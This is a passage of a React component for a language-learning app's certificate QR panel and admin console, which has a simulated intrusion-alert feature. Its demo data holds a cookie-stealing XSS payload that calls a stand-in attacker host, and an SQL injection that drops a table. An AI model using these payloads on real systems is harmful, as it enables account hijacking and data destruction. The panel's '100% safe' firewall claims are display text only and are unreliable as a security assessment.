                    }`}
                  >
                    <div className="flex flex-col md:flex-row items-center justify-between gap-4">
                      <div className="flex items-center gap-3.5 w-full md:w-auto">
                        {qrPreviewDataUrl ? (
                          <img
                            src={qrPreviewDataUrl}
                            alt="Certificate QR Code"
                            className="w-20 h-20 rounded-2xl border-2 border-amber-400 bg-white p-1.5 shadow-md shrink-0"
                          />
                        ) : (
                          <div className="w-20 h-20 rounded-2xl bg-amber-100 flex items-center justify-center shrink-0">
                            <QrCode className="w-9 h-9 text-amber-700" />
                          </div>
                        )}
                        <div className="flex-1 text-xs space-y-1">
                          <div className="font-display font-extrabold text-sm text-amber-600 dark:text-amber-300 flex items-center gap-1.5">
                            <QrCode className="w-4 h-4" />
                            <span>{uiCopy.qrGeneratorTitle}</span>
                          </div>
                          <p className="opacity-85">{uiCopy.qrGeneratorSubtitle}</p>
                          <div className="flex flex-wrap items-center gap-1.5 pt-1">
                            <input
                              type="text"
                              value={customQrText}
                              onChange={(e) => setCustomQrText(e.target.value)}
                              placeholder={mt.customQrInputPlaceholder}
                              className={`flex-1 min-w-[210px] px-3 py-1.5 rounded-xl border text-xs font-bold ${
                                isDark
                                  ? 'bg-slate-900 border-slate-700 text-white'
                                  : 'bg-white border-amber-300 text-slate-900'
                              }`}
                            />
                            {customQrText && (
                              <button
                                type="button"
                                onClick={() => setCustomQrText('')}
                                className="px-2.5 py-1.5 rounded-xl bg-slate-200 dark:bg-slate-700 text-xs font-extrabold flex items-center gap-1 cursor-pointer"
                              >
                                <RefreshCw className="w-3 h-3" />
                                <span>{mt.autoDataBtn}</span>
                              </button>
                            )}
                            <button
                              type="button"
                              onClick={handleDownloadStandaloneQrPng}
                              disabled={!qrPreviewDataUrl}
                              className="px-3 py-1.5 rounded-xl bg-amber-500/20 hover:bg-amber-500/30 border border-amber-400/50 text-amber-800 dark:text-amber-200 text-xs font-extrabold flex items-center gap-1 cursor-pointer disabled:opacity-50"
                            >
                              <Download className="w-3.5 h-3.5" />
                              <span>{mt.downloadQrPngBtn}</span>
                            </button>
                          </div>
                          {qrEncodedPayload && (
                            <div
                              dir="ltr"
                              className="text-[10px] opacity-70 truncate max-w-md pt-0.5 font-mono"
                            >
                              QR Data: {qrEncodedPayload}
                            </div>
                          )}
                        </div>
                      </div>

                      <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-2.5 w-full md:w-auto shrink-0">
                        <button
                          type="button"
                          onClick={handleDownloadStandaloneQrPng}
                          disabled={!qrPreviewDataUrl}
                          className="px-4 py-3.5 rounded-2xl bg-gradient-to-b from-emerald-400 to-teal-600 hover:brightness-105 text-white font-display font-extrabold text-xs sm:text-sm shadow-[0_4px_0_#0F766E] flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 whitespace-nowrap"
                        >
                          <QrCode className="w-4 h-4" />
                          <span>📲 {mt.downloadQrPngBtn}</span>
                        </button>

                        <button
                          type="button"
                          onClick={() => generateAndDownloadCertificatePdf()}
                          disabled={isGeneratingPdf}
                          className="px-5 py-3.5 rounded-2xl bg-gradient-to-b from-[#FACC15] to-[#EA580C] hover:brightness-105 text-slate-950 font-display font-extrabold text-sm sm:text-base shadow-[0_4px_0_#9A3412] flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 whitespace-nowrap"
                        >
                          <Download className="w-5 h-5" />
                          <span>
                            {isGeneratingPdf
                              ? mt.generatingPdfBtn
                              : mt.downloadCertPdfBtn}
                          </span>
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* TAB 3: PROFESSIONAL ENTERPRISE SAAS ADMIN CONSOLE (ONLY rendered when canOpenAdminPanel === true via /mustafa or verified admin) */}
              {activeTab === 'admin' && canOpenAdminPanel && (
                <div className="space-y-4">
                  {/* 1. Executive Top Workspace Header Bar */}
                  <div
                    className={`rounded-xl border px-4 py-3.5 flex flex-col md:flex-row md:items-center justify-between gap-3 ${
                      isDark
                        ? 'bg-slate-900 border-slate-800 text-slate-100'
                        : 'bg-slate-900 border-slate-800 text-white'
                    }`}
                  >
                    <div className="flex items-center gap-3 min-w-0">
                      <div className="w-9 h-9 rounded-lg bg-sky-500/15 border border-sky-400/30 text-sky-400 flex items-center justify-center shrink-0">
                        <ShieldCheck className="w-5 h-5" />
                      </div>
                      <div className="min-w-0">
                        <div className="flex flex-wrap items-center gap-2">
                          <span
                            dir="ltr"
                            className="text-[11px] font-mono uppercase tracking-wider text-slate-400"
                          >
                            ADMIN CONSOLE / LEARNER DIRECTORY
                          </span>
                          <span className="inline-flex items-center gap-1.5 text-[11px] font-medium text-emerald-400">
                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                            <span>{BOOTSTRAPPED_ADMIN_EMAIL}</span>
                          </span>
                        </div>
                        <h4 className="font-display font-bold text-sm sm:text-base text-white mt-0.5">
                          {mt.adminHeaderTitle}
                        </h4>
                      </div>
                    </div>

                    <div className="flex items-center gap-2 shrink-0">
                      {!isAdminUser ? (
                        <button
                          type="button"
                          onClick={async () => {
                            setAuthError('');
                            try {
                              await signInWithGooglePopup();
                              showTempToast(mt.adminGoogleConnectedToast);
                            } catch (err: any) {
                              setAuthError(
                                err?.message || mt.adminGoogleErrorMsg
                              );
                            }
                          }}
                          className="px-3.5 py-2 rounded-lg bg-sky-500 hover:bg-sky-400 text-slate-950 text-xs font-bold transition-colors cursor-pointer whitespace-nowrap flex items-center gap-1.5"
                        >
                          <ShieldCheck className="w-3.5 h-3.5" />
                          <span>Sign in with Learning Balloon (Google)</span>
                        </button>
                      ) : (
                        <button
                          type="button"
                          onClick={async () => {
                            if (onSignOut) {
                              await onSignOut();
                            } else {
                              await signOutLearner();
                              onClose();
                            }
                          }}
                          className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 border border-slate-700 text-rose-400 text-xs font-semibold flex items-center gap-1.5 cursor-pointer whitespace-nowrap"
                        >
                          <LogOut className="w-3.5 h-3.5" />
                          <span>{mt.adminSignOutBtn}</span>
                        </button>
                      )}
                    </div>
                  </div>

                  {authError && (
                    <div className="px-3.5 py-2.5 rounded-lg bg-rose-500/10 border border-rose-500/30 text-rose-500 text-xs font-semibold">
                      {authError}
                    </div>
                  )}

                  {/* 2. Four-Column Executive KPI Strip (Single-Elevation Hairline Grid with Tabular Numerals) */}
                  <div
                    className={`grid grid-cols-2 lg:grid-cols-4 rounded-xl border overflow-hidden divide-y lg:divide-y-0 lg:divide-x ${
                      isDark
                        ? 'bg-slate-900/90 border-slate-800 divide-slate-800'
                        : 'bg-white border-slate-200 divide-slate-200'
                    }`}
                  >
                    <div className="p-3.5 sm:p-4">
                      <div className="flex items-center justify-between text-xs text-slate-500 dark:text-slate-400 font-medium">
                        <span>{mt.kpiTotalProfiles}</span>
                        <Users className="w-4 h-4 text-slate-400" />
                      </div>
                      <div
                        className="mt-1.5 text-xl sm:text-2xl font-display font-bold tracking-tight"
                        style={{ fontVariantNumeric: 'tabular-nums' }}
                      >
                        {effectiveLearnersForCharts.length}
                      </div>
                      <div className="text-[11px] text-slate-500 dark:text-slate-400 mt-0.5">
                        {mt.kpiTotalProfilesSub}
                      </div>
                    </div>

                    <div className="p-3.5 sm:p-4">
                      <div className="flex items-center justify-between text-xs text-slate-500 dark:text-slate-400 font-medium">
                        <span>{mt.kpiAvgStreak}</span>
                        <Flame className="w-4 h-4 text-amber-500" />
                      </div>
                      <div
                        className="mt-1.5 text-xl sm:text-2xl font-display font-bold tracking-tight text-amber-500"
                        style={{ fontVariantNumeric: 'tabular-nums' }}
                      >
                        {analyticsSummary.avgStreak}d
                      </div>
                      <div className="text-[11px] text-slate-500 dark:text-slate-400 mt-0.5">
                        {mt.kpiAvgStreakSub}
                      </div>
                    </div>

                    <div className="p-3.5 sm:p-4">
                      <div className="flex items-center justify-between text-xs text-slate-500 dark:text-slate-400 font-medium">
                        <span>{mt.kpiTotalStars}</span>
                        <Star className="w-4 h-4 text-yellow-500" />
                      </div>
                      <div
                        className="mt-1.5 text-xl sm:text-2xl font-display font-bold tracking-tight"
                        style={{ fontVariantNumeric: 'tabular-nums' }}
                      >
                        {analyticsSummary.totalStarsAll.toLocaleString()}
                      </div>
                      <div className="text-[11px] text-slate-500 dark:text-slate-400 mt-0.5">
                        {mt.kpiTotalStarsSub}
                      </div>
                    </div>

                    <div className="p-3.5 sm:p-4">
                      <div className="flex items-center justify-between text-xs text-slate-500 dark:text-slate-400 font-medium">
                        <span>{mt.kpiCompletedCert}</span>
                        <Award className="w-4 h-4 text-emerald-500" />
                      </div>
                      <div
                        className="mt-1.5 text-xl sm:text-2xl font-display font-bold tracking-tight text-emerald-500"
                        style={{ fontVariantNumeric: 'tabular-nums' }}
                      >
                        {
                          effectiveLearnersForCharts.filter(
                            (r) => getLearnerNumericLevel(r) === 4
                          ).length
                        }
                      </div>
                      <div className="text-[11px] text-slate-500 dark:text-slate-400 mt-0.5">
                        {mt.kpiCompletedCertSub}
                      </div>
                    </div>
                  </div>

                  {/* 2.2 REAL-TIME ANTI-HACK & INTRUSION DETECTION SECURITY CENTER */}
                  <div
                    className={`rounded-2xl border-2 p-4 sm:p-5 space-y-4 ${
                      securityIncidents.length > 0
                        ? isDark
                          ? 'bg-gradient-to-r from-rose-950/70 via-slate-900 to-red-950/60 border-rose-500/70 shadow-[0_12px_36px_rgba(225,29,72,0.25)]'
                          : 'bg-gradient-to-r from-rose-50 via-white to-red-50 border-rose-300 shadow-sm'
                        : isDark
                        ? 'bg-gradient-to-r from-emerald-950/40 via-slate-900 to-sky-950/40 border-emerald-500/40'
                        : 'bg-gradient-to-r from-emerald-50/80 via-white to-sky-50/80 border-emerald-200'
                    }`}
                  >
                    <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-3">
                      <div className="flex items-start gap-3">
                        <div
                          className={`w-11 h-11 rounded-2xl flex items-center justify-center shrink-0 shadow-md ${
                            securityIncidents.length > 0
                              ? 'bg-rose-600 text-white animate-pulse'
                              : 'bg-emerald-600 text-white'
                          }`}
                        >
                          {securityIncidents.length > 0 ? (
                            <AlertTriangle className="w-6 h-6" />
                          ) : (
                            <ShieldCheck className="w-6 h-6" />
                          )}
                        </div>
                        <div>
                          <div className="flex flex-wrap items-center gap-2">
                            <h5 className="font-display font-extrabold text-sm sm:text-base">
                              🛡️ Anti-Hack & Intrusion Detection System (ہیکنگ الرٹ اور سیکیورٹی سسٹم)
                            </h5>
                            <span
                              className={`px-2.5 py-0.5 rounded-full text-[10px] font-black uppercase tracking-wider ${
                                securityIncidents.length > 0
                                  ? 'bg-rose-600 text-white'
                                  : 'bg-emerald-500/20 text-emerald-600 dark:text-emerald-300 border border-emerald-500/30'
                              }`}
                            >
                              {securityIncidents.length > 0
                                ? `🚨 ${securityIncidents.length} HACK ATTEMPTS BLOCKED`
                                : '✓ 24/7 FIREWALL ACTIVE'}
                            </span>
                          </div>
                          <p className="text-xs text-slate-600 dark:text-slate-300 mt-1">
                            جب بھی کوئی آپ کی ویب سائٹ ہیک کرنے، اسکرپٹ انجیکشن (XSS/SQLi) ڈالنے یا سکور چھیڑنے کی کوشش کرے گا، سسٹم فوری طور پر حملہ بلاک کر کے سائرن بجائے گا اور یہاں مکمل تفصیل ریکارڈ کرے گا۔
                          </p>
                        </div>
                      </div>

                      <div className="flex flex-wrap items-center gap-2 shrink-0">
                        <button
                          type="button"
                          onClick={() => {
                            const demoSamples = [
                              {
                                attackType: 'XSS / Script Injection' as const,
                                severity: 'critical' as const,
                                payload: `<script>fetch('https://hacker.site/steal?cookie='+document.cookie)</script>`,
                                source: 'Login / Username Input (Test Simulation)',
                              },
                              {
                                attackType: 'SQL / NoSQL Injection' as const,
                                severity: 'critical' as const,
                                payload: `' OR 1=1; DROP TABLE learners; --`,
                                source: 'Search / Database Query Guard (Test Simulation)',
                              },
                              {
                                attackType: 'LocalStorage / Score Tampering' as const,
                                severity: 'critical' as const,
                                payload: `Tampered values: stars=9999999, streak=5000`,
                                source: 'LocalStorage Integrity Shield (Test Simulation)',
                              },
                            ];
                            const sample =
                              demoSamples[
                                securityIncidents.length % demoSamples.length
                              ];
                            recordSecurityIncident({
                              attackType: sample.attackType,
                              severity: sample.severity,
                              payload: sample.payload,
                              source: sample.source,
                              attackerName: 'Simulated Hacker Probe (ڈیمو ٹیسٹ)',
                              attackerEmail: 'suspicious.probe@unknown-ip.net',
                              playAlarm: true,
                            });
                            showTempToast(
                              '🚨 Test Hack Attempt Simulated, Blocked & Logged!'
                            );
                          }}
                          className="px-3.5 py-2 rounded-xl bg-rose-600 hover:bg-rose-500 text-white font-display font-extrabold text-xs cursor-pointer shadow-sm flex items-center gap-1.5"
                        >
                          <AlertTriangle className="w-3.5 h-3.5" />
                          <span>🧪 ٹیسٹ ہیک الرٹ چیک کریں (Simulate Hack)</span>
                        </button>

                        {securityIncidents.length > 0 && (
                          <>
                            <button
                              type="button"
                              onClick={() => {
                                markAllSecurityIncidentsRead();
                                showTempToast('✓ تمام سیکیورٹی الرٹس پڑھ لیے گئے');
                              }}
                              className="px-3 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-extrabold text-xs cursor-pointer"
                            >
                              ✓ Mark Read
                            </button>
                            <button
                              type="button"
                              onClick={() => {
                                clearSecurityIncidents();
                                showTempToast('🗑️ سیکیورٹی لاگز صاف کر دیے گئے');
                              }}
                              className="px-3 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-rose-300 font-extrabold text-xs cursor-pointer flex items-center gap-1"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                              <span>Clear Logs</span>
                            </button>
                          </>
                        )}
                      </div>
                    </div>

                    {/* Security Status Mini KPI Row */}
                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
                      <div
                        className={`p-3 rounded-xl border ${
                          isDark
                            ? 'bg-slate-900/90 border-slate-800'
                            : 'bg-white border-slate-200'
                        }`}
                      >
                        <div className="text-[10px] font-bold uppercase tracking-wider text-slate-400">
                          🛡️ Firewall Status
                        </div>
                        <div className="font-display font-extrabold text-xs sm:text-sm text-emerald-500 mt-1">
                          ACTIVE · Auto-Block ON
                        </div>
                      </div>

                      <div
                        className={`p-3 rounded-xl border ${
                          isDark
                            ? 'bg-slate-900/90 border-slate-800'
                            : 'bg-white border-slate-200'
                        }`}
                      >
                        <div className="text-[10px] font-bold uppercase tracking-wider text-slate-400">
                          🚨 Blocked Hack Attempts
                        </div>
                        <div className="font-mono font-black text-sm sm:text-base text-rose-500 mt-1">
                          {securityIncidents.length}
                        </div>
                      </div>

                      <div
                        className={`p-3 rounded-xl border ${
                          isDark
                            ? 'bg-slate-900/90 border-slate-800'
                            : 'bg-white border-slate-200'
                        }`}
                      >
                        <div className="text-[10px] font-bold uppercase tracking-wider text-slate-400">
                          ⚡ Active Shields
                        </div>
                        <div className="font-display font-extrabold text-xs text-sky-500 mt-1">
                          XSS · SQLi · Storage · DevTools
                        </div>
                      </div>

                      <div
                        className={`p-3 rounded-xl border ${
                          isDark
                            ? 'bg-slate-900/90 border-slate-800'
                            : 'bg-white border-slate-200'
                        }`}
                      >
                        <div className="text-[10px] font-bold uppercase tracking-wider text-slate-400">
                          👑 Owner Alert Account
                        </div>
                        <div
                          dir="ltr"
                          className="font-mono font-bold text-xs text-amber-500 truncate mt-1"
                        >
                          {BOOTSTRAPPED_ADMIN_EMAIL}
                        </div>
                      </div>
                    </div>

                    {/* Forensic Intrusion Log List */}
                    {securityIncidents.length === 0 ? (
                      <div
                        className={`p-4 rounded-xl border text-center text-xs font-bold ${
                          isDark
                            ? 'bg-slate-950/60 border-slate-800 text-emerald-400'
                            : 'bg-white/90 border-emerald-200 text-emerald-700'
                        }`}
                      >
                        ✅ ابھی تک کوئی ہیکنگ کی کوشش نہیں ہوئی۔ آپ کی ویب سائٹ 100% محفوظ ہے! (آپ اوپر والے بٹن سے ٹیسٹ ہیک الرٹ چیک کر سکتے ہیں)
                      </div>
                    ) : (
                      <div className="space-y-2 max-h-64 overflow-y-auto pr-1">
                        {securityIncidents.map((inc) => (
                          <div
                            key={inc.id}
                            className={`p-3 rounded-xl border flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 ${
                              isDark
                                ? 'bg-slate-950/90 border-rose-500/40 text-white'
                                : 'bg-white border-rose-200 text-slate-900 shadow-2xs'
                            }`}
                          >
                            <div className="space-y-1 min-w-0 flex-1">
                              <div className="flex flex-wrap items-center gap-2">
                                <span
                                  className={`px-2 py-0.5 rounded-full text-[10px] font-black uppercase ${
                                    inc.severity === 'critical'
                                      ? 'bg-rose-600 text-white'
                                      : inc.severity === 'high'
                                      ? 'bg-orange-500 text-white'
                                      : 'bg-amber-500 text-slate-950'
                                  }`}
                                >
                                  {inc.severity}
                                </span>
                                <span className="font-display font-extrabold text-xs sm:text-sm text-rose-500 dark:text-rose-400">
                                  {inc.attackType}
                                </span>
                                <span className="text-[11px] font-mono text-slate-400">
                                  · {new Date(inc.timestamp).toLocaleTimeString()}{' '}
                                  ({new Date(inc.timestamp).toLocaleDateString()})
                                </span>
                                <span className="px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-500 text-[10px] font-extrabold">
                                  🛡️ BLOCKED & LOGGED
                                </span>
                              </div>

                              <div
                                dir="ltr"
                                className="text-xs font-mono bg-rose-950/30 dark:bg-rose-950/60 border border-rose-500/20 text-rose-600 dark:text-rose-200 px-2.5 py-1 rounded-lg break-all"
                              >
                                Payload: {inc.payload}
                              </div>

                              <div className="flex flex-wrap items-center gap-3 text-[11px] text-slate-500 dark:text-slate-400">
                                <span>
                                  📍 <strong>Target:</strong> {inc.source}
                                </span>
                                <span>
                                  👤 <strong>User:</strong> {inc.attackerName} (
                                  {inc.attackerEmail})
                                </span>
                                <span className="truncate max-w-xs">
                                  💻 <strong>Device:</strong> {inc.userAgent}
                                </span>
                              </div>
                            </div>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>

                  {/* 2.4 EXECUTIVE ONBOARDING INSIGHTS & 100% AUTO-STREAK TELEMETRY */}
                  <div
                    className={`rounded-2xl border-2 p-4 sm:p-5 space-y-3.5 ${
                      isDark
                        ? 'bg-gradient-to-r from-slate-900 via-sky-950/40 to-amber-950/30 border-sky-500/40'
                        : 'bg-gradient-to-r from-sky-50 via-white to-amber-50 border-sky-200'
                    }`}
                  >
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <div className="flex items-center gap-2">
                        <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-emerald-500/15 border border-emerald-500/30 text-emerald-500 text-xs font-extrabold">
                          <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                          <span>100% AUTO-STREAK ENGINE ACTIVE</span>
                        </span>
                        <span className="text-xs font-extrabold text-slate-500 dark:text-slate-300">
                          · Onboarding & Learner Survey Insights
                        </span>
                      </div>
                      <div className="flex flex-wrap items-center gap-2">
                        {onTriggerGoalCelebration && (
                          <button
                            type="button"
                            onClick={() => {
                              onClose();
                              onTriggerGoalCelebration();
                            }}
                            className="px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-amber-400 to-orange-500 text-slate-950 font-extrabold text-xs shadow-xs cursor-pointer flex items-center gap-1.5"
                          >
                            <Flame className="w-3.5 h-3.5 fill-slate-950" />
                            <span>🎉 Trigger Goal Achieved Celebration</span>
                          </button>
                        )}
                        {onOpenOnboardingStep && (
                          <button
                            type="button"
                            onClick={() => {
                              onClose();
                              onOpenOnboardingStep('referral');
                            }}
                            className="px-3.5 py-1.5 rounded-xl bg-[#0066FF] hover:bg-[#0052CC] text-white font-extrabold text-xs shadow-xs cursor-pointer"
                          >
                            ⚙️ Edit Onboarding Questions
                          </button>
                        )}
                      </div>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                      <div
                        className={`p-3.5 rounded-xl border ${
                          isDark
                            ? 'bg-slate-900/90 border-slate-800'
                            : 'bg-white border-slate-200'
                        }`}
                      >
                        <div className="text-[11px] font-bold uppercase tracking-wider text-slate-400">
                          📣 Discovery / Referral Source
                        </div>
                        <div className="font-display font-extrabold text-sm sm:text-base mt-1 flex items-center gap-2">
                          <span>
                            {
                              obCopy.referralOptions[
                                onboardingData?.referralSource || 'youtube'
                              ]?.icon
                            }
                          </span>
                          <span>
                            {
                              obCopy.referralOptions[
                                onboardingData?.referralSource || 'youtube'
                              ]?.title
                            }
                          </span>
                        </div>
                      </div>

                      <div
                        className={`p-3.5 rounded-xl border ${
                          isDark
                            ? 'bg-slate-900/90 border-slate-800'
                            : 'bg-white border-slate-200'
                        }`}
                      >
                        <div className="text-[11px] font-bold uppercase tracking-wider text-slate-400">
                          🗣️ Conversation Level Selected
                        </div>
                        <div className="font-display font-extrabold text-sm sm:text-base mt-1 text-sky-500">
                          {onboardingData?.proficiencyType === 'some_conversation'
                            ? obCopy.convLevels[
                                onboardingData.conversationAbility ||
                                  'level_1_basic'
                              ]?.title
                            : obCopy.startFromScratchTitle}
                        </div>
                      </div>

                      <div
                        className={`p-3.5 rounded-xl border ${
                          isDark
                            ? 'bg-slate-900/90 border-slate-800'
                            : 'bg-white border-slate-200'
                        }`}
                      >
                        <div className="text-[11px] font-bold uppercase tracking-wider text-slate-400">
                          🎯 Daily Practice & Auto-Streak
                        </div>
                        <div className="font-display font-extrabold text-sm sm:text-base mt-1 text-amber-500">
                          🔥 {onboardingData?.dailyMinutes || 10} min/day ·{' '}
                          {streakDays}d / {streakGoalDays}d Goal
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* 2.5 ADMIN UNLOCK CONTROLS FOR WORDS & 90 CONVERSATION TOPICS */}
                  <div
                    className={`rounded-2xl border-2 p-4 sm:p-5 space-y-4 ${
                      isDark
                        ? 'bg-gradient-to-r from-purple-950/50 via-slate-900 to-emerald-950/40 border-purple-500/40'
                        : 'bg-gradient-to-r from-purple-50 via-white to-emerald-50 border-purple-200'
                    }`}
                  >
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <div>
                        <h5 className="font-display font-extrabold text-sm sm:text-base flex items-center gap-2">
                          <Sparkles className="w-4 h-4 text-purple-500" />
                          <span>
                            🔓 Words & 90 Conversation Topics — Admin Unlock Control
                          </span>
                        </h5>
                        <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                          By default, Words and Conversation Topics (1 → 90 Traveler to Resident) unlock step-by-step one by one. Use these controls to unlock any or all Words & Topics immediately.
                        </p>
                      </div>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      {/* Words Unlock Card */}
                      <div
                        className={`p-4 rounded-xl border space-y-3 ${
                          isDark
                            ? 'bg-slate-900/90 border-slate-800'
                            : 'bg-white border-slate-200 shadow-2xs'
                        }`}
                      >
                        <div className="flex items-center justify-between">
                          <span className="font-display font-extrabold text-xs sm:text-sm flex items-center gap-1.5">
                            <span>🍎 1. Words Unlock Control</span>
                          </span>
                          <span className="px-2.5 py-0.5 rounded-full text-xs font-mono font-black bg-amber-500/20 text-amber-500">
                            {Math.min(
                              Math.max(1, wordsTotal),
                              Math.max(adminUnlockedWordsCount, wordsCompleted + 1)
                            )}{' '}
                            / {Math.max(1, wordsTotal)} Unlocked
                          </span>
                        </div>

                        <div className="flex flex-wrap items-center gap-2">
                          <button
                            type="button"
                            onClick={() => {
                              onChangeAdminUnlockedWordsCount?.(Math.max(1, wordsTotal));
                              showTempToast(`🔓 All ${wordsTotal} Words Unlocked!`);
                            }}
                            className="px-3.5 py-2 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-extrabold text-xs cursor-pointer shadow-xs"
                          >
                            🔓 Unlock All ({wordsTotal}) Words
                          </button>

                          <button
                            type="button"
                            onClick={() => {
                              const next = Math.min(
                                Math.max(1, wordsTotal),
                                Math.max(adminUnlockedWordsCount, wordsCompleted + 1) + 1
                              );
                              onChangeAdminUnlockedWordsCount?.(next);
                              showTempToast(`🔓 Unlocked up to Word #${next}`);
                            }}
                            className="px-3 py-2 rounded-xl bg-sky-500/20 hover:bg-sky-500/30 border border-sky-500/40 text-sky-400 font-extrabold text-xs cursor-pointer"
                          >
                            +1 Word
                          </button>

                          <button
                            type="button"
                            onClick={() => {
                              const next = Math.min(
                                Math.max(1, wordsTotal),
                                Math.max(adminUnlockedWordsCount, wordsCompleted + 1) + 5
                              );
                              onChangeAdminUnlockedWordsCount?.(next);
                              showTempToast(`🔓 Unlocked up to Word #${next}`);
                            }}
                            className="px-3 py-2 rounded-xl bg-sky-500/20 hover:bg-sky-500/30 border border-sky-500/40 text-sky-400 font-extrabold text-xs cursor-pointer"
                          >
                            +5 Words
                          </button>

                          <button
                            type="button"
                            onClick={() => {
                              onChangeAdminUnlockedWordsCount?.(1);
                              showTempToast('🔒 Words reset to sequential step-by-step unlocking!');
                            }}
                            className="px-3 py-2 rounded-xl bg-rose-500/15 hover:bg-rose-500/25 border border-rose-500/30 text-rose-400 font-extrabold text-xs cursor-pointer"
                          >
                            🔒 Reset Step-by-Step
                          </button>
                        </div>
                      </div>

                      {/* Conversation 90 Topics Unlock Card */}
                      <div
                        className={`p-4 rounded-xl border space-y-3 ${
                          isDark
                            ? 'bg-slate-900/90 border-slate-800'
                            : 'bg-white border-slate-200 shadow-2xs'
                        }`}
                      >
                        <div className="flex items-center justify-between">
                          <span className="font-display font-extrabold text-xs sm:text-sm flex items-center gap-1.5">
                            <span>✈️ 2. Conversation 90 Topics Unlock</span>
                          </span>
                          <span className="px-2.5 py-0.5 rounded-full text-xs font-mono font-black bg-purple-500/20 text-purple-400">
                            {Math.min(90, Math.max(1, adminUnlockedTopicsCount))} / 90 Topics Unlocked
                          </span>
                        </div>

                        <div className="flex flex-wrap items-center gap-2">
                          <button
                            type="button"
                            onClick={() => {
                              onChangeAdminUnlockedTopicsCount?.(90);
                              showTempToast('🔓 All 90 Conversation Topics Unlocked!');
                            }}
                            className="px-3.5 py-2 rounded-xl bg-purple-500 hover:bg-purple-400 text-white font-extrabold text-xs cursor-pointer shadow-xs"
                          >
                            🔓 Unlock All 90 Topics
                          </button>

                          <button
                            type="button"
                            onClick={() => {
                              const next = Math.min(90, Math.max(1, adminUnlockedTopicsCount) + 1);
                              onChangeAdminUnlockedTopicsCount?.(next);
                              showTempToast(`🔓 Unlocked up to Topic #${next}`);
                            }}
                            className="px-3 py-2 rounded-xl bg-purple-500/20 hover:bg-purple-500/30 border border-purple-500/40 text-purple-300 font-extrabold text-xs cursor-pointer"
                          >
                            +1 Topic
                          </button>

                          <button
                            type="button"
                            onClick={() => {
                              const next = Math.min(90, Math.max(1, adminUnlockedTopicsCount) + 10);
                              onChangeAdminUnlockedTopicsCount?.(next);
                              showTempToast(`🔓 Unlocked up to Topic #${next}`);
                            }}
                            className="px-3 py-2 rounded-xl bg-purple-500/20 hover:bg-purple-500/30 border border-purple-500/40 text-purple-300 font-extrabold text-xs cursor-pointer"
                          >
                            +10 Topics
                          </button>

                          <button
                            type="button"
                            onClick={() => {
                              onChangeAdminUnlockedTopicsCount?.(1);
                              showTempToast('🔒 Topics reset to Topic #1 (Sequential Unlocking)!');
                            }}
                            className="px-3 py-2 rounded-xl bg-rose-500/15 hover:bg-rose-500/25 border border-rose-500/30 text-rose-400 font-extrabold text-xs cursor-pointer"
                          >
                            🔒 Reset to Topic 1
                          </button>
                        </div>
                      </div>
                    </div>

                    {/* 3. Custom Stars Add (+) & Minus (-) Two-Box Quick Control */}
                    {(() => {
                      const targetLearnerForStars =
                        selectedLearnerRecord || effectiveLearnersForCharts[0];
                      if (!targetLearnerForStars) return null;
                      return (
                        <div
                          className={`p-4 rounded-xl border space-y-3 ${
                            isDark
                              ? 'bg-slate-900/90 border-amber-500/30'
                              : 'bg-amber-50/60 border-amber-200 shadow-2xs'
                          }`}
                        >
                          <div className="flex flex-wrap items-center justify-between gap-2">
                            <span className="font-display font-extrabold text-xs sm:text-sm flex items-center gap-1.5">
                              <span>
                                ⭐ 3. Custom Stars Add (+) & Minus (-) Boxes —{' '}
                                {targetLearnerForStars.displayName}
                              </span>
                            </span>
                            <span className="px-3 py-1 rounded-full text-xs font-mono font-black bg-amber-500/20 text-amber-500 border border-amber-500/30">
                              Current: {targetLearnerForStars.stars} ⭐
                            </span>
                          </div>

                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                            {/* BOX 1: ADD STARS (+) */}
                            <div
                              className={`p-3 rounded-xl border space-y-2 ${
                                isDark
                                  ? 'bg-emerald-950/30 border-emerald-500/40'
                                  : 'bg-white border-emerald-300'
                              }`}
                            >
                              <label className="block text-[11px] font-extrabold text-emerald-500 uppercase tracking-wider">
                                ➕ Box 1: Add Stars (स्टार्स जोड़ें / سٹارز جمع کریں)
                              </label>
                              <div className="flex items-center gap-2">
                                <input
                                  type="number"
                                  min={1}
                                  max={100000}
                                  value={customStarsAddInput}
                                  onChange={(e) =>
                                    setCustomStarsAddInput(e.target.value)
                                  }
                                  onKeyDown={(e) => {
                                    if (e.key === 'Enter') {
                                      const addVal = Math.max(
                                        0,
                                        Math.floor(Number(customStarsAddInput) || 0)
                                      );
                                      if (addVal <= 0) return;
                                      const nextStars = Math.min(
                                        100000,
                                        Number(targetLearnerForStars.stars || 0) +
                                          addVal
                                      );
                                      handleAdminBoostLearner(
                                        targetLearnerForStars,
                                        { stars: nextStars },
                                        `${targetLearnerForStars.displayName}: +${addVal} ⭐ (${nextStars} ⭐)`
                                      );
                                    }
                                  }}
                                  placeholder="Enter stars to add..."
                                  className={`flex-1 px-3 py-2 rounded-lg border text-xs font-mono font-bold outline-none ${
                                    isDark
                                      ? 'bg-slate-950 border-slate-700 text-emerald-400 focus:border-emerald-400'
                                      : 'bg-slate-50 border-slate-300 text-slate-900 focus:border-emerald-500'
                                  }`}
                                />
                                <button
                                  type="button"
